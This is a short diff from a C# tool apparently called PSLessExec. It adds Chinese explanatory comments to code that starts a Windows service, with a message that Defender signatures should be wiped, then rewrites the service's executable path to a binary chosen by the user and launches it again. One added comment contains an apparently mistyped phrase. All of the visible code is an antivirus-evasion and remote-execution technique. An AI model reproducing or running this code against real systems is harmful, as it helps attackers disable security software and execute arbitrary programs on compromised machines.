@@ -86,11 +86,11 @@ namespace PSLessExec
             bResult = StartService(schService, 0, null);
             Console.WriteLine("Launched service, defender signatures should be wiped.");
 
-            // Pass 2: Run the chosen binary
+            // Pass 2: Run the chosen binary ;ChangeServiceConfigA是用來改赴物設定的
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, args[2], null, null, null, null, null, null);
             Console.WriteLine($"Overwrote service executable to become '{args[2]}', result: {bResult}.");
 
-            // Run the service for Pass 2
+            // Run the service for Pass 2 ;StartService才是把服務跑起來
             bResult = StartService(schService, 0, null);
             Console.WriteLine("Launched service. Check for execution!");
 
